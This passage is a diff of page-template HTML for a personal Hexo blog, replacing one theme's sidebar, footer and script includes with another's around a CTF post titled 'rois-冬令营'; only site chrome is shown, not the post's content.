src="/imgr/19.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="rois-冬令营"/></a><div class="content"><a class="title" href="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/" title="rois-冬令营">rois-冬令营</a><time datetime="2022-02-05T13:41:57.000Z" title="Created 2022-02-05 21:41:57">2022-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/20/2022/1/notes/" title="Notes"><img src="/imgr/JxEsC+ai.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Notes"/></a><div class="content"><a class="title" href="/2022/01/20/2022/1/notes/" title="Notes">Notes</a><time datetime="2022-01-20T12:37:47.000Z" title="Created 2022-01-20 20:37:47">2022-01-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/" title="湖湘杯"><img src="/imgr/22.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="湖湘杯"/></a><div class="content"><a class="title" href="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/" title="湖湘杯">湖湘杯</a><time datetime="2021-11-17T11:15:31.000Z" title="Created 2021-11-17 19:15:31">2021-11-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/01/2021/buu/26/" title="bluecms"><img src="/imgr/20.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="bluecms"/></a><div class="content"><a class="title" href="/2021/11/01/2021/buu/26/" title="bluecms">bluecms</a><time datetime="2021-11-01T12:55:54.000Z" title="Created 2021-11-01 20:55:54">2021-11-01</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/8.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 4v1d</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div class="aplayer no-destroy" data-id="000PeZCQ1i4XVs" data-server="tencent" data-type="artist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
-POWERMODE.shake = true;
-POWERMODE.mobile = true;
-document.body.addEventListener('input', POWERMODE);
-</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script></div></body></html>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>4v1d</li>
+    <li><strong>本文链接：</strong><a href="http://daweitech.github.io/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/index.html" title="http:&#x2F;&#x2F;daweitech.github.io&#x2F;2022&#x2F;02&#x2F;05&#x2F;2022&#x2F;1&#x2F;rois-%E5%86%AC%E4%BB%A4%E8%90%A5&#x2F;index.html">http:&#x2F;&#x2F;daweitech.github.io&#x2F;2022&#x2F;02&#x2F;05&#x2F;2022&#x2F;1&#x2F;rois-%E5%86%AC%E4%BB%A4%E8%90%A5&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+          <section class="donate">
+  <div id="qrcode-donate">
+    <img   class="lazyload" data-original="https://pic.izhaoo.com/alipay.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
+  </div>
+  <div class="icon">
+    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
+    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
+  </div>
+</section>
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/2022/02/10/2022/2/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/"><i class="iconfont iconleft"></i>网鼎杯2020玄武组-SSRFMe</a>
+    <a href="/2022/01/20/2022/1/notes/">Notes<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-text">web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto"><span class="toc-text">crypto</span></a></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=894519210 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://github.com/zhaoo "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:izhaoo@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
